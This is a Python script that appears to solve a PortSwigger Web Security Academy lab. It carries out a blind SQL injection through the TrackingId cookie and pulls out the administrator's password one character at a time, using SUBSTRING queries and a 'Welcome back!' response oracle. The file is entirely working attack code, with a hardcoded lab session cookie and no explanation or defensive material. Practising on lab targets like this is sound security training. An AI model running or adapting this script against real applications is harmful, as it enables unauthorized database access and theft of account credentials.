import requests

def send_request(payload):
    burp0_url = "https://0a51000503bc23ce818870ac00050050.web-security-academy.net:443/filter?category=Gifts"
    burp0_cookies = {"TrackingId": f"{payload}", "session": "s8PUB3kjWRaosIZc2tW8BgN6fwESeffz"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"",
                     "Sec-Ch-Ua-Mobile": "?0",
                     "Sec-Ch-Ua-Platform": "\"Windows\"",
                     "Accept-Language": "en-US,en;q=0.9",
                     "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
                     "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
                     "Referer": "https://0a51000503bc23ce818870ac00050050.web-security-academy.net/",
                     "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

    return result.text

characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

# Out of range if equals to ''
index = 1
while True:
    flag=False
    for c in characters:
        injected=f"'AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{c}'--"
        # Correct cookie: XdYcpCihYIau52mb
        payload = f"XdYcpCihYIau52mb{injected}"

        result = send_request(payload)
        end_of_loop=f"XdYcpCihYIau52mb'AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)=''--"
        if send_request(end_of_loop).find("Welcome back!")>0:
            flag=True
            break
        elif result.find("Welcome back!")>0:
            print(f"Found character: {c}")
            password += c
            index += 1
            break
    if flag:
        break
print(f"Extracted password: {password}")